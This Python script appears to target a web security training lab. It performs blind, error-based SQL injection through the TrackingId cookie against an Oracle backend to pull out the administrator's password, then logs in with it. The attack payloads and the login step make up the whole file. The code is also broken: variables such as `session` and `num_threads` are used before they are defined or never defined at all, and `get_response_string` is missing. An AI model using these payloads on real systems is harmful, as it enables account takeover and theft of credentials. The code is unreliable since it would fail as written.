"""
This is not script for automatization solve lab, but he give you password
"""
import sys
import logging
import urllib3
import string
import concurrent.futures

import requests

import utils
from shop import Shop
from sqli import SQLi
log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}][{levelname}] [{name}] {message}",
    style = "{",
    datefmt="%H:%M:%S",
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class MySQLi(SQLi):
    def __init__(self, tracking_id, session_token):
        super().max_length = 100
        self.tracking_id = tracking_id
        self.session_token = session_token
    def format_length_query(self, inner_query, length):
        return (
            f"{self.tracking_id}'||(SELECT CASE WHEN ((select LENGTH(({inner_query})) from dual)"
            f"={length}) THEN TO_CHAR(1/0) ELSE NULL END from dual)-- "
        )
        
    def format_char_query(self, inner_query, index, char):
        return(
            f"{self.tracking_id}'||(SELECT CASE WHEN (("
            f"select substr(({inner_query}),{index},1) from dual)=chr({char})"
            " THEN TO_CHAR(1/0) ELSE NULL END from dual)-- "
        )
    def is_true(self, resp):
        if resp.status_code == 200:
            return False
        return True
    def format_request(self, url, outer_query):
        cookies = {
            "TrackingId": outer_query,
            "session": self.session_token,
        }
        request = requests.Request("GET", url, cookies=cookies)
        prepped = request.prepare()
        return prepped
          

def main(args):
    sess = requests.Session()
    shop = Shop(args.url, args.no_proxy, session)
    session = requests.Session()
    inner_query = "SELECT password from users where username = 'administrator'"
    respone_string = get_response_string(
        inner_query, shop.base_url, shop.no_proxy, num_threads
        )
    log.info(f"Response is: {respone_string}")
    shop.login("administrator", respone_string)
    shop.is_solved()
if __name__ == "__main__":
    args = utils.parse_args(sys.argv)
    main(args)
    
    